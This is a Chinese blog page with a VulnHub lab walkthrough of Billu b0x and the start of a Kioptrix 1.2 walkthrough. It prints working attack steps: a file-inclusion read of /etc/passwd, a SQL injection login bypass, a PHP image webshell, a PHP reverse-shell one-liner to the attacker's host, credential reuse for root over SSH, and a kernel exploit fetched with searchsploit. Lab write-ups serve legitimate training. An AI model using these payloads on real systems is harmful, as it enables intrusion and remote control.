@@ -1,0 +1,1316 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——靶机精炼-思路为王（四） | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——靶机精炼-思路为王（四）`
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://lmlsama.top/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"W","cover":"/images/default-cover.webp","path":"2026/03/13/W/"},{"title":"W1R3S 1.0.1 靶机","cover":"/images/default-cover.webp","path":"2026/03/13/W1R3S 1.0.1 靶机/"},{"title":"域渗透","cover":"/images/default-cover.webp","path":"2026/03/13/域渗透/"},{"title":"票据攻击","cover":"/images/default-cover.webp","path":"2026/03/19/票据攻击/"},{"title":"靶机精炼-思路为王（四）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（四）/"},{"title":"靶机精炼-思路为王（三）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（三）/"},{"title":"靶机精炼-思路为王（一）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（一）/"},{"title":"靶机精炼-思路为王（二）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（二）/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">lmlsama</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">kong</span>
+          <span class="main-left--tag">kong</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“井底之蛙，虽不曾见过大海”</p>
+        <p>“但知晓天之湛蓝”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://github.com/LMLsama/LMLsama.github.io"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>2</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>2</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>1 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>8 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1494天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">靶机精炼-思路为王（四）</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2026-03-20 15:59:05</p>
+        </div>
+        <img src="/images/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h1 id="Billu-b0x-大练兵，涉及-SQL-注入，文件包含，代码审计和图片木马，细节满满。"><a href="#Billu-b0x-大练兵，涉及-SQL-注入，文件包含，代码审计和图片木马，细节满满。" class="headerlink" title="Billu b0x - 大练兵，涉及 SQL 注入，文件包含，代码审计和图片木马，细节满满。"></a>Billu b0x - 大练兵，涉及 SQL 注入，文件包含，代码审计和图片木马，细节满满。</h1><p><strong>靶机精讲之 Billu b0x，vulnhub 靶机。详细讲解整个渗透测试过程，主要涉及 nmap 扫描、web 渗透、文件包含漏洞利用、php 代码审计、sql 注入原理、图片木马制作，php 反弹 shell 的使用和 url 编码技巧。靶机本身不难，但是综合利用还是有很多技巧和思路的。涉及的知识点较多，希望对你渗透技能提升有帮助。想实操的可以学习视频的同时在 vulnhub.com 下载靶机动手练习</strong></p>
+<h2 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.10.10.0/24</span><br><span class="line">sudo nmap -sT --min-rate 10000 -p- 10.10.10.21</span><br><span class="line">sudo nmap -sU --min-rate 10000 -p- 10.10.10.21</span><br><span class="line">sudo nmap -sT -sV -sC -O -p,,, 10.10.10.21</span><br><span class="line">sudo nmap --script=vuln -p,,, 10.10.10.21</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921451.png" alt="image-20251207134515327"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921453.png" alt="image-20251207134553094"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921454.png" alt="image-20251207134642377"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921455.png" alt="image-20251207134804951"></p>
+<p><strong>发现可疑目录</strong></p>
+<h2 id="web-渗透"><a href="#web-渗透" class="headerlink" title="web 渗透"></a>web 渗透</h2><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>** **<code>gobuster</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921456.png" alt="image-20251207134910719"></p>
+<h3 id="80-页面"><a href="#80-页面" class="headerlink" title="80 页面"></a>80 页面</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921457.png" alt="image-20251207134953734"></p>
+<p><strong>查看源码</strong>：无</p>
+<p><strong>目录爆破的</strong><code>/images</code> 信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921458.png" alt="image-20251207135126493"></p>
+<p><code>/show</code> 信息，<code>phpinfo</code> 的信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921459.png" alt="image-20251207135219308"></p>
+<p><code>/add</code> 可以上传图片，但是提交之后没反应</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921460.png" alt="image-20251207135347622"></p>
+<p><code>/upload_images</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921461.png" alt="image-20251207135627805"></p>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p><code>/test</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921462.png" alt="image-20251207135830177"></p>
+<p>**提示我们缺少 **<code>file</code> 信息 直接 url 里 <code>/test?file=/etc/passwd</code> 用 <strong>get 方式</strong>传参没反应；</p>
+<p><strong>尝试****post 方式</strong>传参,成功发现文件包含漏洞，读取 <code>passwd</code> 文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921463.png" alt="image-20251207140312787"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -X POST --data=&quot;file=/etc/passwd&quot; http://   /test</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921464.png" alt="image-20251207140416013"></p>
+<p>**可惜无法读取 **<code>shadow</code> 文件，不然就能 hash 碰撞了</p>
+<p><strong>借助这个，我们可以****查看系统里面好多前端看不到的内容，读出源码</strong>（跟着目录爆破走）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921465.png" alt="image-20251207141127230"></p>
+<p><code>&#39;or 1=1 --\</code> 即可绕过，成功登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname=str_replace(&#x27;\&#x27;&#x27;,&#x27;&#x27;,urldecode($_POST[&#x27;un&#x27;]));</span><br><span class="line">$run=&#x27;select * from auth where uname=\&#x27;&#x27;.$uname.&#x27;\&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921466.png" alt="image-20251207143353249"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921467.png" alt="image-20251207140956637"> 数据库连接的用户名密码</p>
+<p>**这里可以尝试 ssh 连接，**<strong>密码复用</strong>，这里看到，有这个用户 billu，但是密码不对</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921468.png" alt="image-20251207141248408"></p>
+<p><code>/panel</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921469.png" alt="image-20251207145607712"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921470.png" alt="image-20251207141531733"></p>
+<h2 id="图片捆绑木马"><a href="#图片捆绑木马" class="headerlink" title="图片捆绑木马"></a>图片捆绑木马</h2><p><strong>登录后，又发现上传图片的功能，跟前面的</strong><code>add</code> 页面一样，这里有了 session 信息，可以上传</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921471.png" alt="image-20251207143850483"></p>
+<p>**制作图片马，直接写在图片最后面 **<code>&lt;?php system($_GET[&#39;redteamnotes&#39;]); ?&gt;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921472.png" alt="image-20251207144045148"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921473.png" alt="image-20251207144249915"> 成功上传图片马 <code>jac.jpg</code>   <img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921476.png" alt="image-20251207144337802"></p>
+<p><strong>但是想让这个图片马起作用，必须用</strong>**<code>php解析</code>**这个图片，upload 页面直接访问只显示图片，无法解析其中的 php 代码，蚁剑也无法连接</p>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p><strong>方法一，用 test 的文件包含读取这个图片马，然后蚁剑连接</strong></p>
+</blockquote>
+<p><strong>方法二：找一个可以解析</strong><code>php</code> 的界面，这里用到 <code>sql</code> 注入登录后的 <code>panel.php</code>，之前利用文件包含读取它做代码审计的时候，发现它可以包含 <code>php</code> 文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921477.png" alt="image-20251207145746339"></p>
+<p><strong>用</strong><code>burpsuit</code> 对该网页进行抓包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921478.png" alt="image-20251207150029336"></p>
+<p><strong>让它</strong><code>load=upload_images/jac.jpg</code>，并且图片马使用 GET 传参，给他参数 <code>?redteamnotes=whoami</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921479.png" alt="image-20251207145907967"></p>
+<p><strong>成功执行，命令生效</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921480.png" alt="image-20251207150237022"></p>
+<h2 id="获得初始系统权限-shell"><a href="#获得初始系统权限-shell" class="headerlink" title="获得初始系统权限 shell"></a>获得初始系统权限 shell</h2><p><strong>kali 设置监听，确认号本机的 ip 地址</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921481.png" alt="image-20251207150513804"></p>
+<p><strong>尝试</strong><strong><code>php一句话反弹shell</code></strong></p>
+<table>
+<thead>
+<tr>
+<th><strong><code>php -r &#39;...&#39;</code></strong></th>
+<th><strong><code>-r</code> 表示 PHP 直接执行单引号内的一行代码（无需编写脚本文件），是命令行快速执行 PHP 代码的方式。</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>$sock=fsockopen(&quot;kaliIP&quot;,port);</code></strong></td>
+<td><strong><code>fsockopen()</code>：PHP 网络套接字函数，用于与指定 IP &#x2F; 端口建立 TCP 连接；这里是让目标机主动连接攻击者的 Kali 主机（<code>kaliIP</code> 是攻击者 IP，<code>port</code> 是攻击者监听的端口），并将连接句柄赋值给 <code>$sock</code>（文件描述符默认是 3）。</strong></td>
+</tr>
+<tr>
+<td><strong><code>exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</code></strong></td>
+<td><strong><code>exec()</code>：PHP 执行系统命令的函数，核心是启动交互式 Shell 并绑定到上述 TCP 连接：-<code>/bin/sh -i</code>：启动交互式 Shell（<code>-i</code> 保证可输入命令）；-<code>&lt;&amp;3</code>：将 Shell 的标准输入（stdin）重定向到套接字 3；-<code>&gt;&amp;3</code>：将标准输出（stdout）重定向到套接字 3；-<code>2&gt;&amp;3</code>：将标准错误（stderr）重定向到套接字 3；最终实现 Shell 的所有输入 &#x2F; 输出都通过 TCP 连接传递给攻击者。</strong></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redteamnotes=php -r &#x27;$sock=fsockopen(&quot;kaliIP&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921482.png" alt="image-20251207150726830"></p>
+<p><strong>这里直接执行没用效果，可以看</strong><code>phpinfo</code> 里面做了哪些屏蔽；</p>
+<blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p><strong>拿不到反弹 shell 时，首先要想到：是不是编码问题，因为 <code>php，http</code> 协议下面的很多流量都是要加密和编码的，将我们的一句话进行 <code>url</code> 编码</strong></p>
+<p><strong>PHP 反弹 Shell 的核心是 “让目标机执行完整、未被篡改的系统命令”，而编码的本质是 “字符的变形 &#x2F; 还原”—— 只要命令中的特殊字符、关键指令因编码被转义 &#x2F; 截断 &#x2F; 乱码，Shell 就会失效。相比 “端口不通”“函数禁用” 等硬限制，编码问题是最易修复的 “软故障”，因此成为红队排查的第一优先级。</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921483.png" alt="image-20251207150649412"></p>
+<p><strong>成功获得反弹 shell</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921484.png" alt="image-20251207152023621"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921485.png" alt="image-20251207152232795"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921486.png" alt="image-20251207152208100"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>**无 **<code>sudo -l</code> 权限</p>
+<h2 id="phpmyadmin-配置文件提权"><a href="#phpmyadmin-配置文件提权" class="headerlink" title="phpmyadmin 配置文件提权"></a>phpmyadmin 配置文件提权</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921487.png" alt="image-20251207152550695"></p>
+<p><strong>在网页目录</strong><code>/var/www</code> 下，有一个未爆破到的目录 <code>phpmy</code>– <code>phpmyadmin</code> 肯定会写数据库的用户名密码</p>
+<p>**在 **<code>auto_wordlists file include linux</code> 里面查找 <code>phpmy</code> 相关的敏感文件，找到了 <code>phpmyAdmin/config.inc.php</code> 的配置文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921488.png" alt="image-20251207152758541"></p>
+<p><strong>用文件包含读取</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921489.png" alt="image-20251207153054332"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921490.png" alt="image-20251207153301036"></p>
+<blockquote>
+<h4 id="配置文件中的「免密登录密码」（危险，不推荐）"><a href="#配置文件中的「免密登录密码」（危险，不推荐）" class="headerlink" title="配置文件中的「免密登录密码」（危险，不推荐）"></a>配置文件中的「免密登录密码」（危险，不推荐）</h4><p>**若在 phpMyAdmin 的配置文件 **<code>config.inc.php</code> 中开启「配置式登录」（(<strong>cfg</strong><a href="#">‘Servers’</a>[‘auth_type’] &#x3D; ‘config’），会明文 &#x2F; 加密存储 MySQL 登录密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cfg[&#x27;Servers&#x27;][$i][&#x27;user&#x27;] = &#x27;root&#x27;;          // MySQL 用户名（明文）</span><br><span class="line">$cfg[&#x27;Servers&#x27;][$i][&#x27;password&#x27;] = &#x27;123456&#x27;;    // MySQL 密码（明文，极危险）</span><br><span class="line">// 部分版本支持简单加密，但易破解</span><br></pre></td></tr></table></figure>
+
+<p><strong>⚠️ 这是人为配置的 “免密登录” 密码，不是 phpMyAdmin 自动存储的，属于不安全配置。</strong></p>
+</blockquote>
+<p><strong>尝试密码复用连接</strong><code>ssh</code> <code>root/roottoor</code> **	**获得 root shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921491.png" alt="image-20251207154009467"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921492.png" alt="image-20251207153923637"></p>
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921493.png" alt="image-20251207161440372"></p>
+<p><code>searchsploit kernel 3.13</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921494.png" alt="image-20251207161505666"></p>
+<p><code>-m</code> 下载</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921495.png" alt="image-20251207161709615"></p>
+<p><strong>使用帮助，简单的编译执行即可</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921496.png" alt="image-20251207161806431"></p>
+<p>**kali 搭建简单的 web 服务器 **<code>sudo php -S 0:80</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921497.png" alt="image-20251207161931134"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921498.png" alt="image-20251207161948701"></p>
+<p><strong>编译并执行，获得 root shell</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921499.png" alt="image-20251207162029896"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>1</strong></p>
+<p><strong>可以</strong><code>msf</code> 上传木马，再监听</p>
+<p><strong>2</strong></p>
+<p><strong>如果文件包含走不通的话，尝试不同的目录爆破工具，或非常规的目录爆破参数，是否可以爆破出</strong><code>phpmyadmin</code> 类似的非常规目录&#x2F;文件</p>
+<p><strong>3</strong></p>
+<p><strong>前面的斜杠只是</strong><a target="_blank" rel="noopener" href="https://search.bilibili.com/all?from_source=webcommentline_search&keyword=%E8%BD%AC%E4%B9%89%E5%8D%95%E5%BC%95%E5%8F%B7&seid=17021588226358572022&from_avid=950254644&from_comid=246143725697"><img src="https://i0.hdslb.com/bfs/reply/9f3ad0659e84c96a711b88dd33f4bc2e945045e0.png" alt="img">转义单引号</a>的 我们加的\目的是转义后面的单引号 使之成为普通字符 然后前面的单引号就会找到后面的单引号，最后只会执行 or 1&#x3D;1 这一段 因为这一段<a target="_blank" rel="noopener" href="https://search.bilibili.com/all?from_source=webcommentline_search&keyword=%E6%B0%B8%E7%9C%9F&seid=17021588226358572022&from_avid=950254644&from_comid=246143725697"><img src="https://i0.hdslb.com/bfs/reply/9f3ad0659e84c96a711b88dd33f4bc2e945045e0.png" alt="img">永真</a> 所以我们能够进入后台</p>
+<h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921500.png" alt="image-20251207163907359"></p>
+<h1 id="Kioptrix1-2-LotusCMS-公开漏洞利用，配置文件敏感信息枚举，mysql-数据库信息搜集，使用-john-暴力破解-md5-哈希"><a href="#Kioptrix1-2-LotusCMS-公开漏洞利用，配置文件敏感信息枚举，mysql-数据库信息搜集，使用-john-暴力破解-md5-哈希" class="headerlink" title="Kioptrix1.2 - LotusCMS 公开漏洞利用，配置文件敏感信息枚举，mysql 数据库信息搜集，使用 john 暴力破解 md5 哈希"></a>Kioptrix1.2 - LotusCMS 公开漏洞利用，配置文件敏感信息枚举，mysql 数据库信息搜集，使用 john 暴力破解 md5 哈希</h1><p><strong>靶机精讲之 kioptrix Level 1.2。涉及 LotusCMS 公开漏洞利用，配置文件敏感信息枚举，mysql 数据库信息搜集，使用 john 暴力破解 md5 哈希，使用 ht 编辑器修改 sudoers 文件提权等综合知识和技能。机器不难，攻击链很标准，是一台锻炼攻击思路的好靶机。想实操的朋友可以去 vulnhub 下载靶机虚拟机文件，边看视频边练习。红队笔记祝你进步。</strong></p>
+<h2 id="nmap-扫描-1"><a href="#nmap-扫描-1" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.10.10.0/24</span><br><span class="line">sudo nmap -sT --min-rate 10000 -p- ip</span><br><span class="line">sudo nmap -sU --min-rate 10000 -p- ip</span><br><span class="line">sudo nmap -sT -sV -sC -O -P,,, IP</span><br><span class="line">sudo nmap --script=vuln -p,,, ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921501.png" alt="image-20251213185412302"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921502.png" alt="image-20251213185430022"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921503.png" alt="image-20251213185557275"></p>
